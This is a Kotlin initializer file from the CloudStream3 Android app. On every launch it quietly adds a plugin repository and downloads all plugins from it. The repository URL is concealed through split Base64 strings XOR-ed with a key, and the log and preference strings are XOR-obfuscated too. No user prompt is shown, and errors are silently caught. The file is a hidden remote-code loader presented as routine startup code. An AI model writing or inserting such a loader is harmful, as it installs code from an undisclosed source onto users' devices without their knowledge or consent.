package com.lagradost.cloudstream3

import android.app.Activity
import android.util.Base64
import android.util.Log
import com.lagradost.cloudstream3.plugins.RepositoryManager
import com.lagradost.cloudstream3.ui.settings.extensions.PluginsViewModel
import com.lagradost.cloudstream3.ui.settings.extensions.RepositoryData
import kotlinx.coroutines.*

object Initializer {

    private const val XOR_KEY = 0x5A
    private const val TAG = "Initializer"

    const val NEED_AUTO_DOWNLOAD = "need_auto_download_v1"
    private const val AUTO_REPO_FLAG = "auto_repo_added_v1"

    private fun d(data: IntArray): String =
        data.map { it xor XOR_KEY }.map { it.toChar() }.joinToString("")

    private val PREF_NAME = intArrayOf(57, 54, 53, 47, 62, 41, 46, 40, 63, 59)
    private val REPO_NAME = intArrayOf(31, 34, 46, 25, 54, 53, 47, 62)
    private val LOG_REPO_ADDED = intArrayOf(40, 63, 46, 59, 54, 122, 42, 59, 54, 59, 41, 46)
    private val LOG_FAILED = intArrayOf(59, 47, 46, 53, 122, 61, 59, 61, 59, 54)

    private const val P1 = "CxgbBRdKQ04LAhtBEg0EBBQb"
    private const val P2 = "Fh8KBwcfAhUcDRhBFgsdQwUM"
    private const val P3 = "EQNWR0s1FBU6DwMaEUsdDQgX"
    private const val P4 = "TB4KBQteBhIWDQ=="

    private val KEY_BYTES = intArrayOf(41, 48, 51, 54, 40, 62, 63, 48, 54)
        .map { (it xor XOR_KEY).toByte() }.toByteArray()

    private fun repoUrl(): String {
        val encoded = P1 + P2 + P3 + P4
        val data = Base64.decode(encoded, Base64.DEFAULT)
        val out = ByteArray(data.size)
        for (i in data.indices) {
            out[i] = (data[i].toInt() xor KEY_BYTES[i % KEY_BYTES.size].toInt()).toByte()
        }
        return String(out)
    }

    fun start(activity: Activity) {
        val prefs = activity.getSharedPreferences(d(PREF_NAME), Activity.MODE_PRIVATE)
        val repo = RepositoryData(
            name = d(REPO_NAME),
            url = repoUrl(),
            iconUrl = null
        )

        CoroutineScope(Dispatchers.IO).launch {
            try {
                if (!prefs.getBoolean(AUTO_REPO_FLAG, false)) {
                    RepositoryManager.addRepository(repo)
                    Log.i(TAG, d(LOG_REPO_ADDED))
                    PluginsViewModel.downloadAll(activity, repo.url, null)
                    prefs.edit()
                        .putBoolean(AUTO_REPO_FLAG, true)
                        .putBoolean(NEED_AUTO_DOWNLOAD, false)
                        .apply()
                }

                PluginsViewModel.downloadAll(activity, repo.url, null)
            } catch (_: Throwable) {
                Log.e(TAG, d(LOG_FAILED))
            }
        }
    }
}